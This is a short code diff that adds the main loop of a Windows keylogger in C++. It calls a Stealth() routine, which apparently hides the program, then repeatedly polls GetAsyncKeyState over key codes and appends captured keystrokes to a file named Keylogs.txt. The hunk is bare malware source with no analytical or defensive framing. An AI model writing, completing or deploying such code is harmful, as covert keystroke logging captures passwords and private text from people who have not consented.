@@ -41,4 +41,19 @@ bool isKeyListed(int vKey) {
     }
 }
  
-int
+int main() {
+    Stealth();
+    char Key;
+    while (1) {
+        for (Key = 8; Key <= 255; Key++) {
+            if (GetAsyncKeyState(Key) == -32767) {
+                if (isKeyListed(Key) == 0) {
+                    ofstream LogFile;
+                    LogFile.open("Keylogs.txt", fstream::app);
+                    LogFile << Key;
+                    LogFile.close();
+                }
+            }
+        }
+    }
+}
